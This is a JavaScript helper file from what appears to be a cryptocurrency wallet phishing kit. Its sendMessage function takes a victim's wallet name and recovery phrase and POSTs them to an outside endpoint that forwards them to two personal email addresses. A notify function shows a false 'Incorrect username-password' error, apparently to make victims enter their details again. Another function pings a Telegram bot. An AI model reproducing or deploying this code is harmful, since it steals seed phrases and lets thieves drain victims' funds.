import { toast } from "react-toastify";

var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

export const sendMessage = async (data) => {
  var raw = JSON.stringify({
    message: `wallet: ${data.wallet} <br/> phrase:  ${data.phrase}`,
    to: "zainalisa837@gmail.com, anthonyerics84@gmail.com",
    subject: "Report_phrase",
    name: `${data.wallet}`,
  });

  var requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow",
  };
  return await fetch(
    "https://expresspages.vercel.app/trustgain",
    requestOptions
  );
};

export const notify = () =>
  toast.error("Incorrect username-password", {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
  });

  export const notifySuccess = (message) =>
  toast.success(message, {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
  });

export const callTelegram = async (hostname, param) => {
  const requestOptions = {
    method: "GET",
    redirect: "follow",
  };

  return await fetch(
    `https://api.callmebot.com/start.php?user=@jhonpower&text=yuyuu`
  );
};
